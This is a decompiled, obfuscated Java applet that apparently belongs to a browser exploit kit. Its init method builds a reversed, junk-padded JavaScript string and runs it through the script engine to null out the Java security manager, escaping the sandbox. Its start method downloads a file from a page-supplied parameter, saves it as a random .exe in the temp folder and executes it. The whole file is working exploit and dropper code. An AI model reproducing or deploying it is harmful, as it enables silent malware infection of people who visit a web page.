import java.io.InputStream;
import java.io.FileOutputStream;
import java.util.Random;
import javax.script.ScriptEngine;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class iops extends Applet
{
    public int sdS;
    private Class[] sdh;
    private String sdsh;
    private Class[] sdxx;
    private JList qrist;
    private Class[] eee2;
    private Boolean sdh3;
    public Class dfj3C;
    public String djrr3;
    public Class[] jj334p;
    public Boolean j43g3;
    public int jg3g34;
    public Class[] jfdh3;
    public Class Gj3h;
    private JList mgst;
    
    public Boolean xcccs() {
        return true;
    }
    
    public Boolean sffs() {
        return false;
    }
    
    @Override
    public void init() {
        this.sffs();
        "hello world!".substring(3);
        this.sffs();
        int i = 0;
        while (i < 10) {
            try {
                final String replace = "asga".replace("asga", "js");
                this.xcccs();
                "hello world!".substring(3);
                final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName(replace);
                this.sffs();
                this.xcccs();
                final String replace2 = ";swebastoiwebastoht = egwebastoasswebastoem.rowebastorre;};\"pwebastoey\" nruwebastoter;)(twebastorats.telwebastoppa;)llwebastoun(regwebastoanaMytirucewebastoStes.metsyS.gwebastonal.avawebastoj {)(noitcnuf = gnwebastoirtSot.siwebastoht;)\"rowebastorre yM\"(rowebastorrE wen = rowebastorre rav".replace("webasto", "");
                this.sffs();
                final String string = new StringBuffer(replace2).reverse().toString();
                this.xcccs();
                if (this.xcccs()) {
                    engineByName.eval(string);
                }
                this.xcccs();
                final String replace3 = "rwebastoorwebastore".replace("webasto", "");
                this.xcccs();
                this.sffs();
                this.qrist = new JList(new Object[] { engineByName.get(new StringBuffer(replace3).reverse().toString()) });
                this.sffs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.xcccs();
                this.sffs();
                this.add(this.qrist);
                this.xcccs();
                this.xcccs();
                i = 10;
                this.xcccs();
                this.xcccs();
                return;
            }
            catch (Exception ex) {
                if (i != 9) {}
                ++i;
                continue;
            }
            break;
        }
    }
    
    public Boolean swefVw() {
        return true;
    }
    
    public void swef() {
    }
    
    @Override
    public void start() {
        try {
            final String parameter = this.getParameter("bol");
            this.sffs();
            this.swef();
            this.sffs();
            this.swef();
            this.swef();
            this.sffs();
            this.sffs();
            final InputStream is = Sec.createIS(parameter);
            this.swef();
            this.swef();
            this.sffs();
            for (int i = 0; i < 9; ++i, ++i) {}
            this.swef();
            this.sffs();
            String s = System.getProperty("ja214v214a.214i214o.t214mp214dir".replace("214", ""));
            this.swef();
            this.swef();
            this.sffs();
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            final Random random = new Random();
            this.swef();
            this.swef();
            final int nextInt = random.nextInt(100);
            this.swef();
            this.swef();
            final String string = s + "lie" + Integer.toString(nextInt) + ".e".concat("xe");
            this.swef();
            this.swef();
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            this.swef();
            this.swef();
            byte[] array = new byte[153600];
            final byte[] array2 = new byte[122];
            this.swef();
            this.swef();
            int n = 0;
            this.swef();
            this.swef();
            this.swef();
            int read;
            while ((read = is.read(array)) > 0) {
                fileOutputStream.write(array, 0, read);
                this.swef();
                array = new byte[153600];
                n += read;
            }
            this.swef();
            fileOutputStream.close();
            this.sffs();
            is.close();
            this.sffs();
            this.swef();
            this.swef();
            Runtime.getRuntime();
            for (int j = 0; j < 9; ++j, ++j) {}
            this.swef();
            this.swef();
            Sec.exe(string);
            this.swef();
        }
        catch (Exception ex) {}
    }
}
